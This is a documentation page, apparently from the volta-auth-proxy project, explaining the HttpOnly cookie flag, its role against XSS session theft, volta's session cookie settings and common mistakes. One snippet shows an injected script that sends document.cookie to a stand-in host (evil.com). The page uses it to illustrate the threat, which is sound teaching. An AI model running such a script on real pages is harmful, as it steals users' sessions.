# HttpOnly (Cookie Flag)

## What is it?

HttpOnly is a flag you can set on a cookie that tells the browser: "This cookie should only be sent with HTTP requests. JavaScript is not allowed to read it, write it, or even know it exists."

When a cookie is set with the HttpOnly flag, calling `document.cookie` in JavaScript will not include that cookie in the results. The browser still sends the cookie with every matching HTTP request (like page loads and API calls), but scripts running on the page cannot touch it.

Setting it looks like this in the `Set-Cookie` header:

```
Set-Cookie: __volta_session=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

The `HttpOnly` part is the flag. No JavaScript access. Period.

## Why does it matter?

The single biggest reason: **XSS protection for session cookies.**

Cross-Site Scripting (XSS) is an attack where an attacker manages to run malicious JavaScript on your web page. Without HttpOnly, the first thing that malicious script does is:

```javascript
// Attacker's injected script
fetch('https://evil.com/steal?cookie=' + document.cookie);
```

If the session cookie is readable by JavaScript, the attacker now has the user's session. They can paste that cookie into their own browser and take over the account.

With HttpOnly:

```javascript
document.cookie
// Returns: "theme=dark; lang=en"
// The session cookie (__volta_session) is NOT listed
// The attacker gets nothing useful
```

The session cookie is invisible to JavaScript. The attacker cannot steal what they cannot see.

Here is the comparison:

```
  WITHOUT HttpOnly:                 WITH HttpOnly:

  Browser                           Browser
  +------------------+              +------------------+
  |  JavaScript:     |              |  JavaScript:     |
  |  document.cookie |              |  document.cookie |
  |  = "session=abc" |              |  = "theme=dark"  |
  |                  |              |                  |
  |  XSS can steal   |              |  XSS CANNOT see  |
  |  the session!    |              |  the session     |
  +------------------+              +------------------+
  |  HTTP requests:  |              |  HTTP requests:  |
  |  Cookie: session |              |  Cookie: session |
  |  = abc           |              |  = abc           |
  +------------------+              +------------------+

  Cookie sent with requests: YES    Cookie sent with requests: YES
  Cookie visible to JS: YES         Cookie visible to JS: NO
```

## How does it work?

When the server includes `HttpOnly` in the `Set-Cookie` header, the browser stores a flag alongside the cookie indicating that it is HTTP-only. The browser enforces this in two ways:

1. **`document.cookie` API.** The browser excludes HttpOnly cookies from the string returned by `document.cookie`. It also refuses to set or modify HttpOnly cookies via this API.

2. **JavaScript Cookie APIs.** The newer `CookieStore` API (where supported) also respects the HttpOnly flag and will not expose these cookies.

The cookie is still included in the `Cookie` header of every HTTP request that matches the cookie's path, domain, and other attributes. The server can read it normally. The restriction is purely on client-side JavaScript access.

Important: HttpOnly does not prevent the cookie from being sent with requests. It does not encrypt the cookie. It does not prevent network-level interception (that is what the `Secure` flag is for). It specifically and only prevents JavaScript from reading the cookie value.

## How does volta-auth-proxy use it?

volta-auth-proxy sets HttpOnly on its session cookie as a core security measure.

**The session cookie.** When a user logs in, volta creates a server-side session and sets a cookie:

```
Set-Cookie: __volta_session=<UUID>; Path=/; Max-Age=28800; HttpOnly; SameSite=Lax
```

The cookie includes:
- `HttpOnly` -- JavaScript cannot access it
- `SameSite=Lax` -- Only sent with same-site requests or top-level navigations
- `Secure` -- Added when the connection is HTTPS (prevents sending over plain HTTP)
- `Max-Age=28800` -- Expires after 8 hours (matching the server-side session TTL)
- `Path=/` -- Sent with all requests to the domain

**Why this matters for volta's architecture.** volta sits in front of downstream applications as an auth gateway (ForwardAuth). Those downstream applications might have XSS vulnerabilities that volta cannot control. Because the session cookie is HttpOnly, even if a downstream app has an XSS bug, the attacker cannot steal the volta session.

```
  Downstream App (wiki.example.com)
  +--------------------------------+
  |  Has an XSS vulnerability!     |
  |                                |
  |  Attacker's script runs:       |
  |  document.cookie               |
  |  -> Returns: "wiki_pref=dark"  |
  |  -> __volta_session is NOT     |
  |     visible (HttpOnly)         |
  |                                |
  |  Attacker CANNOT steal the     |
  |  volta session                 |
  +--------------------------------+
```

**The flash cookie.** volta also uses a `__volta_flash` cookie for flash messages (like "You have joined Acme Corp"). This cookie does NOT have HttpOnly set because it is intentionally short-lived (20-second Max-Age) and carries only UI messages, not security-sensitive data.

**The CSRF token.** volta stores a CSRF token in the server-side session record (not in a cookie). It is rendered into HTML forms as a hidden field. This avoids the need for a separate CSRF cookie.

## Common mistakes

**1. Not setting HttpOnly on session cookies.**
This is the most critical cookie to protect. If you only set HttpOnly on one cookie, it should be the session cookie. Every session cookie should have HttpOnly. No exceptions.

**2. Assuming HttpOnly prevents all cookie theft.**
HttpOnly blocks JavaScript access. It does NOT protect against:
- Network interception (use `Secure` flag + HTTPS for that)
- Cross-site request forgery (use `SameSite` flag for that)
- Server-side vulnerabilities (like SQL injection that reads the session table)

HttpOnly is one layer of defense, not the only layer.

**3. Using JavaScript to read/set session cookies.**
If your application needs JavaScript to access a cookie, that cookie cannot be HttpOnly. This is why some frameworks put JWT tokens in localStorage (so JS can read them) -- but that makes them vulnerable to XSS. The better pattern is volta's approach: keep the session in an HttpOnly cookie and issue short-lived JWTs server-side.

**4. Setting HttpOnly on cookies that legitimately need JS access.**
A theme preference cookie (`theme=dark`) or a language cookie (`lang=en`) might need to be read by client-side JavaScript. Those don't need HttpOnly. The rule is: session and authentication cookies get HttpOnly. UI preference cookies may not need it.

**5. Thinking HttpOnly makes cookies invisible in DevTools.**
HttpOnly cookies are still visible in browser developer tools (the Application/Storage tab). They are also visible in HTTP response headers. HttpOnly specifically blocks programmatic access via JavaScript. A user (or attacker with physical access to the machine) can still see them in DevTools.

**6. Not combining HttpOnly with Secure and SameSite.**
HttpOnly alone is not enough. You also need:
- `Secure` -- so the cookie is only sent over HTTPS
- `SameSite=Lax` (or `Strict`) -- to prevent cross-site request forgery

volta's session cookie uses all three flags together for defense in depth.
